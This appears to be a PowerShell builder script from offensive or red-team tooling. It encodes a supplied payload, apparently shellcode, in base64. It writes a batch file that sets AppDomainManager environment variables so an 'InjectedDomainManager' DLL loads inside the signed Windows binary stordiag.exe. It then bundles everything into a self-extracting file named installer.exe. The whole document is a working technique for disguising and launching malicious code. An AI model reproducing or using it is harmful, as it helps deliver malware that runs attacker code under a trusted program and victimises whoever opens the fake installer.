$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Args[0])
$b64text =[Convert]::ToBase64String($Bytes)
echo "@echo off" | Add-Content -Path setup.bat -Encoding ascii
echo "set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" | Add-Content -Path setup.bat -Encoding ascii
echo "set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager" | Add-Content -Path setup.bat -Encoding ascii
echo "set SHLCD=$b64text" | Add-Content -Path setup.bat -Encoding ascii
echo "stordiag.exe /?" | Add-Content -Path setup.bat -Encoding ascii
.\7za.exe a payload.7z DomainManager.dll setup.bat
cmd.exe /c "copy /b 7zSD.sfx + config.txt + payload.7z installer.exe"